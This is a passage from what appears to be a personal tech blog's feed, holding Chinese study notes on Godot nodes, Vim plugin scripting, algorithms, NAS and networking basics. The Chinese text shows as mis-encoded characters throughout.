class="headerlink" title="38. ç‰©ç†ç³»ç»Ÿ"></a>38. ç‰©ç†ç³»ç»Ÿ</h1><p>å¤§å¤šè¡¨ç°åœ¨ç¢°æ’.</p><h1 id="39-RigidBodyèŠ‚ç‚¹"><a href="#39-RigidBodyèŠ‚ç‚¹" class="headerlink" title="39. RigidBodyèŠ‚ç‚¹"></a>39. RigidBodyèŠ‚ç‚¹</h1><p>åˆšä½“å¿…é¡»å¸¦æœ‰å½¢çŠ¶.</p><p>ç»™ç‰©ä½“ç®€å•çš„å½¢çŠ¶å¯ä»¥å‡å°‘è®¡ç®—é‡.</p><p>å¯ä»¥è°ƒæ•´åˆšä½“çš„è´¨é‡ï¼ŒåŠ é€Ÿåº¦, çº¿é€Ÿåº¦ï¼Œè§’é€Ÿåº¦, å—åŠ›, åŠ›çŸ©ç­‰.</p><p>è¿™æ ·çœ‹æ¥å°±æ˜¯å®Œå…¨æ¨¡æ‹Ÿçš„ä¸€ä¸ªç‰©ç†ä¸–ç•Œçš„ç‰©ä½“.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(info.collider.name)</span></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰“å°å‡ºä¸ä»€ä¹ˆèŠ‚ç‚¹ç¢°æ’.</p><h1 id="40-åˆšä½“å®æˆ˜"><a href="#40-åˆšä½“å®æˆ˜" class="headerlink" title="40. åˆšä½“å®æˆ˜"></a>40. åˆšä½“å®æˆ˜</h1><p>å…‰æ˜¯ <code>CollisionPolygon2D</code> ä¸ä¼šæ˜¾ç¤ºå‡ºå½¢çŠ¶ï¼Œå¯ä»¥æ·»åŠ  <code>Polygon2Dl</code> èŠ‚ç‚¹æ·»åŠ ä¸€ä¸ªå¤šè¾¹å½¢.</p><p>Area2D, æ˜¯ä¸€å—åŒºåŸŸï¼Œèƒ½å¤Ÿæ£€æµ‹åˆ°ç‰©ä½“çš„ç¢°æ’ï¼Œä½†æ˜¯ä¸ä¼šåšä»»ä½•æ“ä½œ.</p><h1 id="41-åˆšä½“çš„Layerå’ŒMask"><a href="#41-åˆšä½“çš„Layerå’ŒMask" class="headerlink" title="41. åˆšä½“çš„Layerå’ŒMask"></a>41. åˆšä½“çš„Layerå’ŒMask</h1><p>Layer è¡¨æ˜ç‰©ä½“ä½äºå“ªä¸€å±‚.</p><p>Mask æ˜¯ç‰©ä½“å»æ£€æµ‹å“ªä¸€å±‚ä¼šå’Œä»–ç¢°æ’.</p><p>Layer æ˜¯æ‰€å±ç»„.</p><p>Mask æ˜¯ç›®æ ‡ç»„.</p><h1 id="42-Line2DèŠ‚ç‚¹"><a href="#42-Line2DèŠ‚ç‚¹" class="headerlink" title="42. Line2DèŠ‚ç‚¹"></a>42. Line2DèŠ‚ç‚¹</h1><p>å¯ä»¥é€šè¿‡ç‚¹çš„ç»„åˆç»˜åˆ¶çº¿. æœ¬è´¨æ˜¯é€šè¿‡äºŒç»´å‘é‡æ•°ç»„æ¥ä¿å­˜æ¯ä¸€ä¸ªç‚¹çš„åæ ‡.</p><p>å¯ä»¥é€šè¿‡ä»£ç åˆ›å»ºè¿™äº›ç‚¹. ç”¨ <code>add_point()</code> æ–¹æ³•:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add_point</span><span class="hljs-params">(Vector2(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>çº¿æœ‰å®½åº¦å¯ä»¥è®¾ç½®ã€‚å®½åº¦å¯ä»¥æ¸å˜.</p><p>ç»™ Player æ·»åŠ å¹»å½±:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">func <span class="hljs-built_in">_process</span>():<br>    var player = <span class="hljs-built_in">get_parent</span>().<span class="hljs-built_in">find_node</span>(<span class="hljs-string">&quot;Player&quot;</span>)<br>    var position = player.position<br>    add.<span class="hljs-built_in">point</span>(position)<br>    if (<span class="hljs-built_in">get_point_count</span>() &gt;= <span class="hljs-number">20</span>):<br>    <span class="hljs-built_in">remove_point</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>è¿˜éœ€è¦è®¾ç½®ç‚¹çš„å®½åº¦çš„å˜åŒ–.</p><h1 id="43-RemoteTransform2DèŠ‚ç‚¹"><a href="#43-RemoteTransform2DèŠ‚ç‚¹" class="headerlink" title="43. RemoteTransform2DèŠ‚ç‚¹"></a>43. RemoteTransform2DèŠ‚ç‚¹</h1><p>èµ·åˆ°ä¸€ä¸ªä»£ç†çš„ä½œç”¨. ç›¸å½“äºä¸€ä¸ªåˆ†èº«.</p><h1 id="44-Path2DèŠ‚ç‚¹"><a href="#44-Path2DèŠ‚ç‚¹" class="headerlink" title="44. Path2DèŠ‚ç‚¹"></a>44. Path2DèŠ‚ç‚¹</h1><p>ä¸€èˆ¬å’Œ PathFolloww2D èŠ‚ç‚¹ç»“åˆä½¿ç”¨.</p><p>å¯ä»¥ç”¨ Path2D èŠ‚ç‚¹ç”»å‡ºä¸€ä¸ªè·¯å¾„ (å°±åƒä¸€ä¸ªè½¨é“). æŒ‚è½½ä¸€ä¸ª PathFolloww2D èŠ‚ç‚¹å°±å¯ä»¥æ²¿ç€è·¯å¾„ç§»åŠ¨. offset å°±æ˜¯ç‰©ä½“è·ç¦» path åŸç‚¹çš„è·ç¦». åœ¨ä»£ç ä¸­å¢åŠ  offset å°±å¯ä»¥è¾¾åˆ°ç§»åŠ¨çš„æ•ˆæœ.</p><p>åˆ©ç”¨ offset å’Œ offset åˆ°è¾¾çš„è¾¹ç•Œå€¼è®¾ç½®é‡å¤.</p><h1 id="45-TilemapèŠ‚ç‚¹åˆæ¢"><a href="#45-TilemapèŠ‚ç‚¹åˆæ¢" class="headerlink" title="45. TilemapèŠ‚ç‚¹åˆæ¢"></a>45. TilemapèŠ‚ç‚¹åˆæ¢</h1><p>Tilemap ä¸€èˆ¬ç”¨äºç”»åœ°å›¾. </p><p>ä¸€ä¸ª Tile Set å¯ä»¥ä¿å­˜ä¸‹æ¥å¤ç”¨.</p><h1 id="46-TileMapèŠ‚ç‚¹çš„BitMask"><a href="#46-TileMapèŠ‚ç‚¹çš„BitMask" class="headerlink" title="46. TileMapèŠ‚ç‚¹çš„BitMask"></a>46. TileMapèŠ‚ç‚¹çš„BitMask</h1><p>BitMask é…åˆè‡ªåŠ¨å¡«å…….</p><p>BitMask é€‰ä¸­çš„åŒºåŸŸå°±æ˜¯æƒ³è¦ç”¨æ¥è‡ªåŠ¨å¡«å……çš„åŒºåŸŸ. (è¿™æ ·è®²ï¼ŒBitMask é€‰ä¸­çš„éƒ¨åˆ†ä¼šæ£€æµ‹å››å‘¨æ˜¯å¦å­˜åœ¨ç”¨ BitMask é€‰ä¸­çš„å›¾å—ä»¥åŠ Icon å›¾å—ï¼Œå¦‚æœæœ‰ï¼Œå°±ä»¥ BitMask ä¸­çš„ç›¸å¯¹ä½ç½®æ˜¾ç¤º)</p><p>ä¸€èˆ¬é€‰æ‹©è§„åˆ™å›¾å½¢.</p><p>Icon å±æ€§é€‰æ‹©çš„æ˜¯é»˜è®¤ç»˜åˆ¶çš„å›¾åƒ.</p><h1 id="47-TileMapèŠ‚ç‚¹çš„Collision"><a href="#47-TileMapèŠ‚ç‚¹çš„Collision" class="headerlink" title="47. TileMapèŠ‚ç‚¹çš„Collision"></a>47. TileMapèŠ‚ç‚¹çš„Collision</h1><p>è®°ä½ TileMap ä¸­æœ‰ Collision é€‰é¡¹å…¶å®å°±å¥½.</p><h1 id="48-Navigation2DèŠ‚ç‚¹"><a href="#48-Navigation2DèŠ‚ç‚¹" class="headerlink" title="48. Navigation2DèŠ‚ç‚¹"></a>48. Navigation2DèŠ‚ç‚¹</h1><p>å¯ä»¥å®ç°è‡ªåŠ¨å¯»è·¯ï¼Œå…¶ä½¿ç”¨ AStar ç®—æ³•.</p><p>å…¶å¿…é¡»å’Œ TileMap é…åˆä½¿ç”¨.</p><p>é¢„åŠ è½½èŠ‚ç‚¹ç¤ºä¾‹ä»£ç :</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">onready <span class="hljs-built_in">var</span> nav_2d : Navigation2D = $Navigation2D<br></code></pre></td></tr></table></figure><p><code>_unhandled_input()</code> æ–¹æ³•ï¼Œå¤„ç†æ²¡æœ‰è¢«å…¶ä»–èŠ‚ç‚¹æ•è·çš„ input event.</p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯ ib äº¤æ¢æœº, RDMA, NIC, ipoib, nfs, cx3</title>
    <link href="/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-ib-%E4%BA%A4%E6%8D%A2%E6%9C%BA-RDMA-NIC-ipoib-nfs-cx3/"/>
    <url>/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-ib-%E4%BA%A4%E6%8D%A2%E6%9C%BA-RDMA-NIC-ipoib-nfs-cx3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://youle.zhipin.com/articles/5a15a64ab255c437qxB93dm1.html">ä»€ä¹ˆæ˜¯ InfiniBand å‚è€ƒ</a></p><p><a href="https://zhuanlan.zhihu.com/p/55142557">ä»€ä¹ˆæ˜¯ RDMA å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®—æ³•å¯¼è®º-Notes</title>
    <link href="/2022/11/10/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-Notes/"/>
    <url>/2022/11/10/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://mitpress.mit.edu/algorithms">ä¹ é¢˜ç­”æ¡ˆæ‰€åœ¨ç½‘ç«™</a></p><h1 id="ç¬¬ä¸€ç« -ç®—æ³•åœ¨è®¡ç®—ä¸­çš„ä½œç”¨"><a href="#ç¬¬ä¸€ç« -ç®—æ³•åœ¨è®¡ç®—ä¸­çš„ä½œç”¨" class="headerlink" title="ç¬¬ä¸€ç«  ç®—æ³•åœ¨è®¡ç®—ä¸­çš„ä½œç”¨"></a>ç¬¬ä¸€ç«  ç®—æ³•åœ¨è®¡ç®—ä¸­çš„ä½œç”¨</h1><p><mark>æ•°æ®ç»“æ„</mark> æ˜¯ä¸€ç§å­˜å‚¨å’Œç»„ç»‡æ•°æ®çš„æ–¹å¼ï¼Œæ—¨åœ¨ä¾¿äºè®¿é—®å’Œä¿®æ”¹.</p><h2 id="1-2-ä½œä¸ºä¸€ç§æŠ€æœ¯çš„ç®—æ³•"><a href="#1-2-ä½œä¸ºä¸€ç§æŠ€æœ¯çš„ç®—æ³•" class="headerlink" title="1.2  ä½œä¸ºä¸€ç§æŠ€æœ¯çš„ç®—æ³•"></a>1.2  ä½œä¸ºä¸€ç§æŠ€æœ¯çš„ç®—æ³•</h2><p>æ—¶é—´å’Œç©ºé—´èµ„æº.</p><h1 id="ç¬¬äºŒç« -ç®—æ³•åŸºç¡€"><a href="#ç¬¬äºŒç« -ç®—æ³•åŸºç¡€" class="headerlink" title="ç¬¬äºŒç«  ç®—æ³•åŸºç¡€"></a>ç¬¬äºŒç«  ç®—æ³•åŸºç¡€</h1><h2 id="2-1-æ’å…¥æ’åº"><a href="#2-1-æ’å…¥æ’åº" class="headerlink" title="2.1 æ’å…¥æ’åº"></a>2.1 æ’å…¥æ’åº</h2><p>å…¶å¯¹äºå°‘é‡å…ƒç´ çš„æ’åºè¾ƒä¸ºæœ‰æ•ˆ.</p><p>å‚æ•°: ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•°ç»„.</p><p>ç”¨æ¥æ¯”è¾ƒçš„é‚£ä¸ªæ•°ç”¨ä¸€ä¸ªå˜é‡ <code>key</code> è¡¨ç¤º. <code>key</code> ç›¸å½“äºæ˜¯ç”¨æ¥ä¿å­˜ä¼šè¢«æ›¿æ¢æ‰çš„é‚£ä¸ªé‡.</p><p>æœªæ’åºçš„å…ƒç´ , ä¾æ¬¡åœ¨å·²æ’åºçš„å…ƒç´ ä¸­æ¯”è¾ƒ.</p><p>å·²æ’åºå¥½çš„å…ƒç´ ä¸­, ä½ åªè¦æ¯”æœ€åä¸€ä¸ªå¤§, é‚£ä¹ˆå°±æ¯”å‰é¢çš„éƒ½å¤§, å¦‚æœæ¯”æœ€åä¸€ä¸ªå°, å°±è¦å’Œå‰é¢æ¯”è¾ƒ, å¦‚:</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>æ˜¯å·²æ’åºå¥½çš„éƒ¨åˆ†, <code>9</code> æ˜¯ä¸‹ä¸€ä¸ªæ•°, <code>9</code> æ¯” <code>6</code> å¤§, é‚£å°±è‚¯å®šæ¯”å‰é¢çš„ <code>1</code> å’Œ <code>3</code> å¤§. è‹¥ <code>2</code> æ˜¯ä¸‹ä¸€ä¸ªæ•°, <code>2</code> æ¯” <code>6</code> å°, é‚£å°±éœ€è¦å†å’Œ <code>3</code> æ¯”è¾ƒ.</p><p><code>i+1</code> å¯ä»¥çœ‹ä½œ <code>i</code> å³è¾¹çš„å…ƒç´ æ¥ç†è§£.</p><p>æ„Ÿè§‰ä¸»è¦æ€è·¯å°±æ˜¯åˆ’åˆ†ä¸ºå·²æ’åºå’Œæœªæ’åºçš„ä¸¤éƒ¨åˆ†.</p><p>å°†å…ƒç´ å³ç§», ç›´åˆ°æ‰¾åˆ° <code>key</code> çš„åˆé€‚ä½ç½®.</p><h2 id="2-2-åˆ†æç®—æ³•"><a href="#2-2-åˆ†æç®—æ³•" class="headerlink" title="2.2 åˆ†æç®—æ³•"></a>2.2 åˆ†æç®—æ³•</h2><p>åˆ†æç®—æ³•çš„ç»“æœæ„å‘³ç€é¢„æµ‹ç®—æ³•éœ€è¦çš„èµ„æº.</p><p>å½“ <code>k</code> æ˜¯ä¸€ä¸ªè¶³å¤Ÿå°çš„æ­£æ•´æ•°æ—¶, æˆ‘ä»¬å°†æŠŠ $2^k$ çš„è®¡ç®—çœ‹æˆä¸€ä¸ªå¸¸é‡æ—¶é—´æ“ä½œ.</p><p>ä¸€èˆ¬æ¥è¯´, ç®—æ³•éœ€è¦çš„æ—¶é—´ä¸è¾“å…¥çš„è§„æ¨¡åŒæ­¥å¢é•¿, æ‰€ä»¥é€šå¸¸æŠŠä¸€ä¸ªç¨‹åºçš„è¿è¡Œæ—¶é—´æè¿°æˆå…¶è¾“å…¥è§„æ¨¡çš„å‡½æ•°.</p><p><mark>è¾“å…¥è§„æ¨¡</mark> çš„æœ€ä½³æ¦‚å¿µä¾èµ–äºç ”ç©¶çš„é—®é¢˜, å¦‚ç”¨è¾“å…¥çš„é¡¹æ•°è¡¨ç¤º, ç”¨è¾“å…¥å›¾çš„é¡¶ç‚¹æ•°å’Œè¾¹æ•°è¡¨ç¤º.</p><p>ä¸€ä¸ªç®—æ³•åœ¨ç‰¹å®šè¾“å…¥ä¸Šçš„ <mark>è¿è¡Œæ—¶é—´</mark> æ˜¯æ‰§è¡Œçš„åŸºæœ¬æ“ä½œæ•°æˆ–æ­¥æ•°. æ¯ä¸€ <mark>æ­¥</mark> çš„æ—¶é—´å’Œæœºå™¨æœ‰å…³.</p><p>ç®—æ³•çš„è¿è¡Œæ—¶é—´æ˜¯æ‰§è¡Œæ¯æ¡è¯­å¥çš„è¿è¡Œæ—¶é—´ä¹‹å’Œ.</p><p>å¾€å¾€åªé›†ä¸­äº <mark>æœ€åçš„è¿è¡Œæ—¶é—´</mark> .</p>]]></content>
    
    
    <categories>
      
      <category>Algorithms</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-NAS</title>
    <link href="/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-NAS/"/>
    <url>/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-NAS/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/NAS/3465615">å‚è€ƒ ç™¾ç§‘</a></p><p>NAS æ˜¯ Network Attached Storage (ç½‘ç»œé™„å±å­˜å‚¨) çš„ç®€ç§°. åˆç§° â€œç½‘ç»œå­˜å‚¨å™¨â€, ä¹Ÿå°±æ˜¯ç”¨æ¥å­˜æ”¾æ•°æ®ã€‚</p><p>NAS é€šå¸¸åœ¨ä¸€ä¸ª LAN ä¸Šå æœ‰è‡ªå·±çš„èŠ‚ç‚¹ï¼Œæ— éœ€åº”ç”¨æœåŠ¡å™¨çš„å¹²é¢„ï¼Œå…è®¸ç”¨æˆ·åœ¨ç½‘ç»œä¸Šå­˜å–æ•°æ®.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•ç¼–å†™-vim-æ’ä»¶</title>
    <link href="/2022/11/10/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-vim-%E6%8F%92%E4%BB%B6/"/>
    <url>/2022/11/10/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-vim-%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="å†™å‡½æ•°ç¤ºä¾‹"><a href="#å†™å‡½æ•°ç¤ºä¾‹" class="headerlink" title="å†™å‡½æ•°ç¤ºä¾‹"></a>å†™å‡½æ•°ç¤ºä¾‹</h1><h2 id="function-ä¸­-â€œ-â€-çš„ä½œç”¨"><a href="#function-ä¸­-â€œ-â€-çš„ä½œç”¨" class="headerlink" title="function! ä¸­ â€œ!â€ çš„ä½œç”¨"></a>function! ä¸­ â€œ!â€ çš„ä½œç”¨</h2><p>å¦‚æœæœ‰åŒåçš„å‡½æ•°åˆ™å°†å…¶é‡è½½.</p><h2 id="å‡½æ•°è·¨æ–‡ä»¶ä½¿ç”¨"><a href="#å‡½æ•°è·¨æ–‡ä»¶ä½¿ç”¨" class="headerlink" title="å‡½æ•°è·¨æ–‡ä»¶ä½¿ç”¨"></a>å‡½æ•°è·¨æ–‡ä»¶ä½¿ç”¨</h2><p>å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">function!</span> <span class="hljs-title">initself</span>#exit_iron<span class="hljs-params">()</span><br><br><span class="hljs-keyword">endfunction</span><br></code></pre></td></tr></table></figure><p>å‰é¢çš„ <code>initself</code> æ˜¯å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶å, <code>exit_iron</code> æ˜¯å‡½æ•°å.</p><h1 id="autocmd-ä½¿ç”¨"><a href="#autocmd-ä½¿ç”¨" class="headerlink" title="autocmd ä½¿ç”¨"></a>autocmd ä½¿ç”¨</h1><p>éœ€è¦ç”¨ <code>augroup</code> åŒ…è£¹. å¯¹åŒä¸€ä¸ªç»„å¤šæ¬¡ä½¿ç”¨ <code>augroup</code> å…¶ä¼šå åŠ .</p><p>ç”¨ <code>augroup</code> å¯èƒ½æ˜¯æ–¹ä¾¿ç»„ç»‡.<br>å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;cat&quot;</span><br><span class="hljs-keyword">augroup</span> END<br><br><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure><p>è¦æƒ³é‡å†™åˆ™ä½¿ç”¨ <code>autocmd!</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    autocmd!<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vim-ä¸­-&lt;Plug&gt;-çš„ä½œç”¨</title>
    <link href="/2022/11/10/vim-%E4%B8%AD-%3CPlug%3E-%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/11/10/vim-%E4%B8%AD-%3CPlug%3E-%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://vi.stackexchange.com/questions/31012/what-does-plug-do-in-vim">å‚è€ƒ</a></p><p><code>&lt;Plug&gt;</code> å¹¶ä¸ä»£è¡¨ä¸€ä¸ªå®é™…çš„é”®å€¼. ç»“åˆåšæ–‡å’Œä¸ªäººç†è§£ï¼Œå…¶ä½œç”¨ä¸º:<br>ç›¸å½“äºä¸€ä¸ªåˆ«åï¼Œæ¯”å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;silent&gt;</span> <span class="hljs-symbol">&lt;plug&gt;</span>(SubversiveSubstitute) :<span class="hljs-symbol">&lt;c-u&gt;</span><span class="hljs-keyword">call</span> subversive#singleMotion#preSubstitute(<span class="hljs-variable">v:register</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-symbol">&lt;cr&gt;</span>:<span class="hljs-keyword">set</span> opfunc=subversive#singleMotion#substituteMotion<span class="hljs-symbol">&lt;cr&gt;</span>g@<br></code></pre></td></tr></table></figure><p>è¿™ä¸€è¡Œçš„æ„æ€å¯ä»¥ç†è§£ä¸ºï¼Œåœ¨ä½¿ç”¨ <code>nnoremap</code> æ—¶ï¼Œå¯ä»¥ç”¨ <code>&lt;plug&gt;(SubversiveSubstitute)</code> æ¥æ›¿æ¢åé¢çš„å†…å®¹.</p><p>ä¸»è¦æ˜¯ä½œè€…å¹¶ä¸æƒ³ç¡®å®šä¸€ä¸ªé”®ä½ï¼Œæƒ³è®©ä½¿ç”¨è€…è‡ªå·±å®šä¹‰ï¼Œå¦‚å®šä¹‰ä¸º:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> gc <span class="hljs-symbol">&lt;plug&gt;</span>(SubversiveSubstitute)    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux-ä¸Š-matlab-å®‰è£…</title>
    <link href="/2022/11/09/Archlinux-%E4%B8%8A-matlab-%E5%AE%89%E8%A3%85/"/>
    <url>/2022/11/09/Archlinux-%E4%B8%8A-matlab-%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ww2.mathworks.cn/support/search.html/answers/130613-internet.html?fq%5B%5D=asset_type_name:answer&fq%5B%5D=category:support/introduct1740&page=1">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è®¡ç®—æœºè‡ªé¡¶å‘ä¸‹æ–¹æ³• Notes</title>
    <link href="/2022/11/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95-Notes/"/>
    <url>/2022/11/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://gaia.cs.umass.edu/kurose_ross/interactive/?q=c1q1_c1q2">é…å¥—ç½‘ç«™</a></p><h1 id="ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œå’Œå› ç‰¹ç½‘"><a href="#ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œå’Œå› ç‰¹ç½‘" class="headerlink" title="ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œå’Œå› ç‰¹ç½‘"></a>ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œå’Œå› ç‰¹ç½‘</h1><h2 id="1-1-ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘"><a href="#1-1-ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘"></a>1.1 ä»€ä¹ˆæ˜¯å› ç‰¹ç½‘</h2><h3 id="1-1-1-å…·ä½“æ„æˆæè¿°"><a href="#1-1-1-å…·ä½“æ„æˆæè¿°" class="headerlink" title="1.1.1 å…·ä½“æ„æˆæè¿°"></a>1.1.1 å…·ä½“æ„æˆæè¿°</h3><p>æ‰€æœ‰è¿æ¥å› ç‰¹ç½‘çš„è®¾å¤‡éƒ½ç§°ä¸º<mark>ä¸»æœº</mark> (host) æˆ–<mark>ç«¯ç³»ç»Ÿ</mark> (end system).</p><p>ç«¯ç³»ç»Ÿé€šè¿‡<mark>é€šä¿¡é“¾è·¯</mark> (communication link) å’Œåˆ†ç»„äº¤æ¢æœº (packet switch) è¿æ¥åˆ°ä¸€èµ·ã€‚</p><h3 id="1-1-2-æœåŠ¡æè¿°"><a href="#1-1-2-æœåŠ¡æè¿°" class="headerlink" title="1.1.2 æœåŠ¡æè¿°"></a>1.1.2 æœåŠ¡æè¿°</h3><p><mark>åˆ†å¸ƒå¼åº”ç”¨ç¨‹åº</mark> (distributed application), å…¶åº”ç”¨ç¨‹åºæ¶‰åŠå¤šä¸ªç›¸äº’äº¤æ¢æ•°æ®çš„ç«¯ç³»ç»Ÿã€‚(è¿™é‡Œçš„å¤šä¸ªç«¯ç³»ç»Ÿå¦‚å¤šäººæ¸¸æˆ, åœ¨çº¿ç¤¾äº¤)</p><p>å› ç‰¹ç½‘æœ‰å‘é€æ•°æ®çš„ç¨‹åºå¿…é¡»éµå¾ªçš„å¥—æ¥å­—æ¥å£ (è§„å®šäº†ä¸€äº›è§„åˆ™, å¦‚é™¤äº†è¦å‘é€çš„æ•°æ®ä¹‹å¤–è¦æä¾›çš„ä¿¡æ¯).</p><h3 id="1-1-3-ä»€ä¹ˆæ˜¯åè®®"><a href="#1-1-3-ä»€ä¹ˆæ˜¯åè®®" class="headerlink" title="1.1.3 ä»€ä¹ˆæ˜¯åè®®"></a>1.1.3 ä»€ä¹ˆæ˜¯åè®®</h3><p><mark>åè®® (protocol) å®šä¹‰äº†åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªé€šä¿¡å®ä½“ä¹‹é—´äº¤æ¢çš„æŠ¥æ–‡çš„æ ¼å¼å’Œé¡ºåº, ä»¥åŠæŠ¥æ–‡å‘é€æˆ–æ¥æ”¶ä¸€æ¡æŠ¥æ–‡æˆ–å…¶ä»–äº‹ä»¶æ‰€é‡‡å–çš„åŠ¨ä½œ</mark> </p><h2 id="1-2-ç½‘ç»œè¾¹ç¼˜"><a href="#1-2-ç½‘ç»œè¾¹ç¼˜" class="headerlink" title="1.2 ç½‘ç»œè¾¹ç¼˜"></a>1.2 ç½‘ç»œè¾¹ç¼˜</h2><p>é€šå¸¸æŠŠä¸å› ç‰¹ç½‘ç›¸è¿çš„è®¡ç®—æœºå’Œå…¶ä»–è®¾å¤‡ç§°ä¸ºç«¯ç³»ç»Ÿ (end system, å› ä¸ºä»–ä»¬å¤„äºäº’è”ç½‘çš„è¾¹ç¼˜).</p><p>ä¸»æœºå’Œç«¯ç³»ç»Ÿæ¦‚å¿µç›¸åŒ.</p><h3 id="1-2-1-æ¥å…¥ç½‘"><a href="#1-2-1-æ¥å…¥ç½‘" class="headerlink" title="1.2.1 æ¥å…¥ç½‘"></a>1.2.1 æ¥å…¥ç½‘</h3><p>æŒ‡å°†ç«¯ç³»ç»Ÿç‰©ç†è¿æ¥åˆ°å…¶è¾¹ç¼˜è·¯ç”±å™¨ (edge router) çš„ç½‘ç»œ.</p><p>DSL (Digital Subscriber Line, æ•°å­—ç”¨æˆ·çº¿), ç”±äºä¸Šè¡Œä¼ è¾“é€Ÿç‡å’Œä¸‹è¡Œä¼ è¾“é€Ÿç‡æ˜¯ä¸åŒçš„, å› æ­¤ä¹Ÿè¢«ç§°ä¸ºæ˜¯ä¸å¯¹ç§°çš„.</p><p>ä¸Šè¡Œä¼¼ä¹ä¸ºå‘é€æ•°æ®, 